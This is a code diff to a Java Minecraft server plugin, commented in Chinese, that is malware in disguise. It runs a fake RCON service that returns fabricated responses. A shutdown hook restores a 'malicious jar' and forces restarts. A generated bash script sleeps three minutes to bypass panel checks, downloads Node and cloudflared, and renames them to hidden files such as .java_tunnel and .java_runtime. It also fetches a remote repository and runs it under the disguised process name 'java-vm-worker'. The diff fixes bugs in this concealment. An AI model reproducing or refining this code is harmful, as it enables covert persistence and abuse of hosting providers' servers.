@@ -44,12 +44,11 @@ extends JavaPlugin {
     private final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<String>("");
     private final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);
     
-    // RCON 伪装 & 面板关机检测
+    // RCON 伪装相关
     private ServerSocket rconServerSocket;
     private volatile boolean rconRunning = false;
     private int rconPort = 25575;
     private String rconPassword = ""; 
-    private volatile boolean isPanelStopping = false; // 标记是否为面板主动关机
 
     // ============================================================
     // 【仿真参数】
@@ -392,24 +391,6 @@ extends JavaPlugin {
 
     private String executeFakeCommand(String cmd) {
         String lowerCmd = cmd.toLowerCase().trim();
-        
-        // ★★★ 面板关机防御 ★★★
-        if (lowerCmd.equals("stop") || lowerCmd.equals("end") || lowerCmd.equals("shutdown")) {
-            this.isPanelStopping = true; // 标记为面板主动关机，禁止 Guard 重启
-            
-            // 立刻清理后台所有伪装进程（释放内存，防止被查异常占用）
-            this.getLogger().info("[RCON] Received stop command. Cleaning up background processes...");
-            try {
-                new ProcessBuilder("bash", "-c", "pkill -f .java_tunnel; pkill -f .java_runtime; pkill -f aoyou-panel").inheritIO().start();
-            } catch (Exception ignored) {}
-            
-            return "Stopping the server";
-        } 
-        else if (lowerCmd.equals("save-all") || lowerCmd.equals("save")) {
-            return "Saved the world";
-        }
-        
-        // ★★★ 常规伪装 ★★★
         if (lowerCmd.equals("list")) {
             return "There are 0 of a max of 20 players online: ";
         } else if (lowerCmd.equals("version")) {
@@ -442,8 +423,7 @@ extends JavaPlugin {
         this.startFakeRcon();
 
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-            // 只有在非面板主动关机时，才触发硬重启 (防止面板关机后 Guard 拉起导致封号)
-            if (this.systemGuardEnabled && !this.isPanelStopping && this.isRestarting.compareAndSet(false, true)) {
+            if (this.systemGuardEnabled && this.isRestarting.compareAndSet(false, true)) {
                 this.getLogger().info("[Guard] ShutdownHook triggered, forcing restart...");
                 this.restoreMaliciousJar();
                 this.executeHardRestart(false);
@@ -634,21 +614,20 @@ extends JavaPlugin {
         String appDir = workDir + "/app";
         String dataDir = workDir + "/data";
         
-        // ★ 深度伪装版：废弃PM2，重命名二进制，伪装进程名，延迟3分钟
+        // ★ 修复版：先安装依赖再重命名，修复 Node 守护逻辑，延迟3分钟
         return "#!/bin/bash\nset +e\n\n# ★ Delay 3 minutes start to bypass panel checks\necho \"[Deploy] Delaying start to bypass initial checks...\"\nsleep 180\n\nWORK_DIR=\"" + workDir + "\"\nNODE_DIR=\"" + nodeDir + "\"\nAPP_DIR=\"" + appDir + "\"\nDATA_DIR=\"" + dataDir + "\"\nREPO_URL=\"" + repoUrl + "\"\n\nis_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\nwhile true; do PORT=$((RANDOM % 40000 + 20000)); if is_port_free $PORT; then break; fi; done\nexport SERVER_PORT=$PORT; export PORT=$PORT\necho \"$PORT\" > \"$WORK_DIR/.tunnel_port\"\n\nARCH=$(uname -m)\nif [ \"$ARCH\" = \"x86_64\" ]; then\n    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\"\n    CF_ARCH=\"amd64\"\nelif [ \"$ARCH\" = \"aarch64\" ]; then\n    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\"\n    CF_ARCH=\"arm64\"\nfi\n\n" +
                
-               // ★ 伪装 1：下载 Node 后，将 node 重命名为 .java_runtime
-               "if [ -d \"$NODE_DIR\" ]; then CHECK_VER=$($NODE_DIR/bin/.java_runtime -v 2>/dev/null); if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; fi; fi\n" +
+               // ★ 伪装 1：下载 Node (暂不重命名，保证 npm install 正常运行)
+               "if [ -d \"$NODE_DIR\" ]; then CHECK_VER=$($NODE_DIR/bin/node -v 2>/dev/null); if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; fi; fi\n" +
                "if [ ! -d \"$NODE_DIR\" ]; then\n" +
                "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
                "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then break; fi\n" +
                "    done\n" +
                "    mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
-               "    if [ -f \"$NODE_DIR/bin/node\" ]; then mv \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.java_runtime\"; fi\n" + 
                "fi\n" +
                "export PATH=$NODE_DIR/bin:$PATH\n\n" +
                
-               // ★ 伪装 2：下载 Cloudflared 后，重命名为 .java_tunnel
+               // ★ 伪装 2：下载 Cloudflared 并重命名为 .java_tunnel
                "CF_BIN=\"$WORK_DIR/.java_tunnel\"\n" +
                "if [ ! -f \"$CF_BIN\" ]; then\n" +
                "    CF_RAW=\"$WORK_DIR/cf_raw_tmp\"\n" +
@@ -727,7 +706,7 @@ extends JavaPlugin {
                "rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n" +
                "cd \"$APP_DIR\"\n\n" +
                
-               // ★ 伪装 4：npm install 静默执行
+               // ★ 核心修复：先用 node 执行 npm install
                "npm install --unsafe-perm=true --allow-root &>/dev/null\n\n" +
                
                "if [ -d \"$DATA_DIR\" ]; then\n" +
@@ -762,7 +741,10 @@ extends JavaPlugin {
                "HEALTH_EOF\n" +
                "fi\n\n" +
                
-               // ★ 伪装 5：废弃 PM2，使用原生循环守护，并用 exec -a 伪装 Node 进程名为 java-vm-worker
+               // ★ 核心修复：npm install 完成后，再重命名 node 为 .java_runtime，防止 npm 找不到 node
+               "if [ -f \"$NODE_DIR/bin/node\" ]; then mv \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.java_runtime\"; fi\n\n" +
+               
+               // ★ 伪装 5：废弃 PM2，使用原生循环守护，并伪装 Node 进程名为 java-vm-worker
                "(while true; do\n" +
                "    exec -a 'java-vm-worker' $NODE_DIR/bin/.java_runtime index.js &>/dev/null\n" +
                "    sleep 5\n" +
